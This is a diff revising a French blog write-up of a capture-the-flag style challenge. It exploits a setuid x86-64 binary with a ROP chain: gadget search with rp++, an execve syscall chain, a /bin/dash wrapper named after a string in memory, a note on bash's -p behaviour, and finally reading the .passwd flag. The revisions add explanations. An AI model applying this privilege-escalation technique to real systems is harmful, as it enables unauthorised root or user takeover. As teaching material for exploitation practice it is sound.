@@ -442,9 +442,9 @@ gdb$ ni
 0x0000000000434e10 in mprotect ()
 </code></pre>
 
-<p>Bien!  Est-ce qu&rsquo;on peut mettre les arguments voulus dans les registres idoines, maintenant?  Je ne vois pas comment faire, arrivé à ce stade.  C&rsquo;est malin, j&rsquo;aurais dû y penser plus tôt.  Ca a l&rsquo;air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.</p>
+<p>Bien!  Est-ce qu&rsquo;on peut mettre les arguments voulus dans les registres idoines, maintenant?  Comment connaître la taille du segment mémoire qu&rsquo;on veut rendre exécutable?  Et depuis où?  C&rsquo;est très probablement faisable, mais je suis débutant et je ne vois pas comment faire, arrivé à ce stade.  C&rsquo;est malin, j&rsquo;aurais dû y penser plus tôt.  Du coup ça m&rsquo;a l&rsquo;air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.</p>
 
-<h2 id="bon-ben-rop">Bon&hellip; ben ROP.</h2>
+<h2 id="bon-ben-va-falloir-passer-par-du-rop">Bon&hellip; ben va falloir passer par du ROP.</h2>
 
 <p>L&rsquo;objectif est de trouver des séquences d&rsquo;instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d&rsquo;opérations qui feront quelque chose de particulier.  En l&rsquo;occurrence, obtenir un shell avec les droits privilégiés.</p>
 
@@ -457,7 +457,7 @@ $ wget https://github.com/downloads/0vercl0k/rp/rp-lin-x64 -O /tmp/p/
 $ chmod +x /tmp/p/rp-lin-x64
 </code></pre>
 
-<p>On a choisi <code>rp++</code>, un peu par hasard.  Et parce que ce qu&rsquo;on va faire est simple (il y en a d&rsquo;autres, comme <code>ROPgadget</code>), car on veut juste <code>pop</code>-er des valeurs de la stack pour les mettre dans des registres.  Nothing fancy, comme on dit.</p>
+<p>On a choisi <code>rp++</code> (il y en a d&rsquo;autres, comme <code>ROPgadget</code>), un peu par hasard.  C&rsquo;est le premier venu quand j&rsquo;ai fait une recherche sur Google et co,,e ce qu&rsquo;on va faire est simple (on veut juste <code>pop</code>-er des valeurs de la stack pour les mettre dans des registres) pas la peine de passer du temps à chercher l&rsquo;outil qui possède les meilleures features&hellip;</p>
 
 <p>On va tenter de faire exécuter un <code>execve()</code> via des gadgets, du coup.  Ce qu&rsquo;on souhaite, c&rsquo;est faire executer <code>execve(&quot;/bin/sh&quot;, NULL, NULL);</code>.  Notons que d&rsquo;après la documentation de l&rsquo;ABI du système, <code>$rax</code> doit contenir le numéro du syscall (et le contenu sera écrasé lors du retour de fonction, si jamais il se produit&hellip; dans notre cas on s&rsquo;en moque, puisqu&rsquo;on veut spawner un shell).  Il faudra donc mettre les registres dans l&rsquo;état suivant:</p>
 
@@ -509,7 +509,21 @@ $ rp-lin-x64 -f prog --unique  -r 1 | egrep &quot;pop rdx&quot;
 $
 </code></pre>
 
-<p>On ne trouve pas <code>&quot;/bin/sh&quot;</code> dans le binaire, ni d&rsquo;autres chemins susceptible de nous plaire&hellip;  On va utiliser un trick:  trouver une petite chaîne dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à <code>/bin/dash</code> qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire <code>/tmp/p</code>, qui est dans le <code>PATH</code>.</p>
+<p>On ne trouve pas <code>&quot;/bin/sh&quot;</code> dans le binaire, ni d&rsquo;autres chemins susceptible de nous plaire&hellip;  On va utiliser un trick:  trouver une chaîne de caractère dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à <code>/bin/dash</code> qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire <code>/tmp/p</code>, qui est dans le <code>PATH</code>.  Pourquoi <code>/bin/dash</code> et pas <code>/bin/sh</code> ou <code>/bin/bash</code>?  Sur ce système, comme souvent, on a ça :</p>
+
+<pre><code>$ ls -l /bin/sh
+lrwxrwxrwx 1 root root 4 mai   16  2015 /bin/sh -&gt; bash
+</code></pre>
+
+<p>Or il semble que <code>bash</code> pose problème à cause de l&rsquo;option <code>-p</code> (pas référencée dans la <code>manpage</code>, juste mentionnée dans un paragraphe), qui a cet effet:</p>
+
+<blockquote>
+<p>If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the  SHEL‐
+LOPTS,  BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at invocation, the startup behavior is the
+same, but the effective user id is not reset.</p>
+</blockquote>
+
+<p>Du coup, plutôt que s&rsquo;embêter à gérer ce cas particulier, autant utiliser <code>/bin/dash</code> qui n&rsquo;a pas ce genre de comportement.</p>
 
 <pre><code>$ readelf -x .rodata ./prog | less
 [...]
@@ -605,9 +619,6 @@ Breakpoint 1, 0x00000000004010ec in main ()
 gdb$ x/i $rip
 =&gt; 0x4010ec &lt;main+142&gt;: ret
 
-gdb$ x/i 0x000000000044d2b4
-   0x44d2b4 &lt;__printf_fp+4676&gt;: pop    rax
-
 gdb$ x/2i 0x000000000044d2b4
    0x44d2b4 &lt;__printf_fp+4676&gt;: pop    rax
    0x44d2b5 &lt;__printf_fp+4677&gt;: ret
@@ -628,7 +639,7 @@ gdb$ x/i 0x0000000000400488
    0x400488 &lt;backtrace_and_maps+183&gt;:   syscall
 </code></pre>
 
-<p>Vérifions que la chaîne est celle attendue:</p>
+<p>Vérifions également que la chaîne est celle attendue:</p>
 
 <pre><code>gdb$ x/s 0x0000000000493c00
 0x493c00:       &quot;Be@&quot;
@@ -668,7 +679,7 @@ Segmentation fault
 <pre><code>execve(&quot;Be@&quot;, [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
 </code></pre>
 
-<p>On est content, on a la confirmation qu&rsquo;<code>execve()</code> est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que&hellip; <code>&quot;Be@&quot;</code> n&rsquo;est pas trouvé (<code>ENOENT</code>)!  En fait le programme regarde dans le <code>CWD</code>.  Il faut donc qu&rsquo;on exécute notre programme depuis le répertoire contenant notre wrapper a <code>/bin/dash</code>:</p>
+<p>On est content, on a la confirmation qu&rsquo;<code>execve()</code> est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que&hellip; <code>&quot;Be@&quot;</code> n&rsquo;est pas trouvé (<code>ENOENT</code>)!  En fait le programme regarde dans le <code>CWD</code> et ne trouve rien.  Donc <code>execve()</code> échoue et on passe à l&rsquo;instruction suivante&hellip; qu&rsquo;on n&rsquo;a pas gérée, <code>$rip</code> contient donc une adresse arbitraire, le programme saute à cette adresse et plante lamentablement.  C&rsquo;est logique, puisque nous avons fourni un chemin relatif, le système ne sait donc pas qu&rsquo;il faut chercher dans <code>/tmp/p</code> et regarde juste dans le répertoire courant.  Il faut donc qu&rsquo;on exécute notre programme depuis le répertoire contenant notre wrapper a <code>/bin/dash</code>:</p>
 
 <pre><code>$ cd /tmp/p &amp;&amp; (perl -e 'print &quot;'$sc'&quot;') | strace ~/prog
 [...]
@@ -692,13 +703,8 @@ Hex result: 41414141414141414141414141414141414141414141414141414141414141414141
 ls
 Be@  ropchain.py  rp-lin-x64
 cd /home/user
-ls -la
-total 876
-drwxr-x---  2 user-cracked user           4096 May 25  2015 .
-drwxr-xr-x 27 root         root           4096 Sep 26 20:01 ..
--r--------  1 user-cracked user-cracked     23 Jun  7  2015 .passwd
--rwsr-x---  1 user-cracked user         877214 May 16  2015 prog
--rw-r-----  1 user-cracked user            383 May 24  2015 prog.c
+ls -a
+    .passwd prog prog.c
 cat .passwd
 CeciEstMonFlagTagadaTsoinTsoin!
 </code></pre>
